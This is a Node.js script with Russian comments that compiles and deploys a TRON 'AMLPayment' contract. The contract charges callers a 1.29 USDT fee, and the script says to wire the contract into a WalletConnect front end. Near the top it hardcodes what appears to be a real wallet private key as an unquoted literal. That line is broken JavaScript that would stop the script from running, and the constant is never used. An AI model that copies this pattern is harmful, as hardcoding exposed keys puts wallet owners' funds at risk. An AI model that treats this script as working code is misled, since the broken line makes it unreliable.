// deploy.js
// Установка: npm install tronweb solc dotenv bip39 hdkey
// Запуск:    node deploy.js

require('dotenv').config();
const solc  = require('solc');
const fs    = require('fs');
const bip39 = require('bip39');
const HDKey = require('hdkey');


const PRIVATE_KEY = 0957cd7bc17e2c145c16339d7c6e46e76f321d930089a7bc52f82fef152fe8df;
const SEED_PHRASE = process.env.SEED_PHRASE;
const NETWORK     = process.env.NETWORK || 'nile';
const FEE_AMOUNT  = 1_290_000; // 1.29 USDT

const NETWORKS = {
  mainnet: { host: 'https://api.trongrid.io',  usdt: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
  nile:    { host: 'https://nile.trongrid.io', usdt: 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj' },
};

const CONTRACT_SOURCE = `
// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0 <0.9.0;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract AMLPayment {
    address public owner;
    IERC20 public usdt;
    uint256 public feeAmount;

    event PaymentReceived(address indexed user, uint256 amount, uint256 timestamp);

    constructor(address _usdt, uint256 _feeAmount) {
        owner = msg.sender;
        usdt = IERC20(_usdt);
        feeAmount = _feeAmount;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function pay() external {
        uint256 allowance = usdt.allowance(msg.sender, address(this));
        require(allowance >= feeAmount, "Insufficient allowance");
        bool success = usdt.transferFrom(msg.sender, owner, feeAmount);
        require(success, "Transfer failed");
        emit PaymentReceived(msg.sender, feeAmount, block.timestamp);
    }

    function setFee(uint256 _newFee) external onlyOwner {
        feeAmount = _newFee;
    }

    function withdrawTokens(address token, uint256 amount) external onlyOwner {
        IERC20(token).transfer(owner, amount);
    }
}`;

// Получаем приватный ключ из seed фразы по пути TRON: m/44'/195'/0'/0/0
async function privateKeyFromSeed(seedPhrase) {
  const trimmed = seedPhrase.trim();
  if (!bip39.validateMnemonic(trimmed)) {
    throw new Error('Невалидная seed фраза — проверь слова и пробелы между ними');
  }
  const seedBuffer = await bip39.mnemonicToSeed(trimmed);
  const root       = HDKey.fromMasterSeed(seedBuffer);
  const child      = root.derive("m/44'/195'/0'/0/0"); // путь TRON
  return child.privateKey.toString('hex');
}

function compile() {
  console.log('🔨 Компилируем...');
  const input = {
    language: 'Solidity',
    sources: { 'AMLPayment.sol': { content: CONTRACT_SOURCE } },
    settings: { outputSelection: { '*': { '*': ['abi', 'evm.bytecode'] } } },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter(e => e.severity === 'error');
  if (errors.length) { errors.forEach(e => console.error(e.formattedMessage)); process.exit(1); }
  console.log('✅ Скомпилировано\n');
  return output.contracts['AMLPayment.sol']['AMLPayment'];
}

async function main() {
  if (!SEED_PHRASE) {
    console.error('❌ Нет SEED_PHRASE в .env');
    console.error('   Добавь: SEED_PHRASE=слово1 слово2 ... слово12');
    process.exit(1);
  }

  const net = NETWORKS[NETWORK];
  console.log(`\n🌐 Сеть: ${NETWORK}`);
  console.log(`💵 USDT: ${net.usdt}`);
  console.log(`💰 Комиссия: ${FEE_AMOUNT / 1_000_000} USDT\n`);

  // Получаем приватный ключ из seed
  console.log('🔑 Получаем приватный ключ из seed фразы...');
  let privateKey;
  try {
    privateKey = await privateKeyFromSeed(SEED_PHRASE);
    console.log('✅ Ключ получен\n');
  } catch (e) {
    console.error('❌', e.message);
    process.exit(1);
  }

  // Загружаем TronWeb
  let TronWeb;
  try {
    const mod = require('tronweb');
    TronWeb = mod.TronWeb ?? mod.default?.TronWeb ?? mod.default ?? mod;
    if (typeof TronWeb !== 'function') throw new Error('не функция');
  } catch (e) {
    console.error('❌ Не удалось загрузить TronWeb:', e.message);
    process.exit(1);
  }

  const { abi, evm } = compile();

  const tronWeb    = new TronWeb({ fullHost: net.host, privateKey });
  const deployer   = tronWeb.address.fromPrivateKey(privateKey);
  const balanceSun = await tronWeb.trx.getBalance(deployer);

  console.log(`👛 Деплоер: ${deployer}`);
  console.log(`💎 Баланс:  ${(balanceSun / 1_000_000).toFixed(2)} TRX\n`);

  if (balanceSun / 1_000_000 < 50) {
    console.warn('⚠️  Мало TRX (~50 нужно для деплоя)');
    if (NETWORK === 'nile') {
      console.warn('   Получи тестовые TRX: https://nileex.io/join/getJoinPage\n');
    }
  }

  console.log('🚀 Деплоим...');
  let contract;
  try {
    contract = await tronWeb.contract().new({
      abi,
      bytecode:   evm.bytecode.object,
      feeLimit:   100_000_000,
      callValue:  0,
      parameters: [net.usdt, FEE_AMOUNT],
    });
  } catch (err) {
    console.error('❌ Ошибка деплоя:', err.message || err);
    process.exit(1);
  }

  const address = tronWeb.address.fromHex(contract.address);
  console.log('\n✅ Готово!');
  console.log('━'.repeat(54));
  console.log(`📄 Адрес контракта: ${address}`);
  console.log(`🔍 TronScan: https://tronscan.org/#/contract/${address}`);
  console.log('━'.repeat(54));
  console.log(`\n👉 Вставь в WalletConnect.jsx:\n   const AML_CONTRACT = '${address}';\n`);

  fs.writeFileSync('deployed.json', JSON.stringify({
    network: NETWORK, address, deployer,
    usdtAddress: net.usdt, feeAmount: FEE_AMOUNT,
    deployedAt: new Date().toISOString(), abi,
  }, null, 2));
  console.log('📁 Сохранено в deployed.json');
}

main().catch(e => { console.error('❌', e.message || e); process.exit(1); });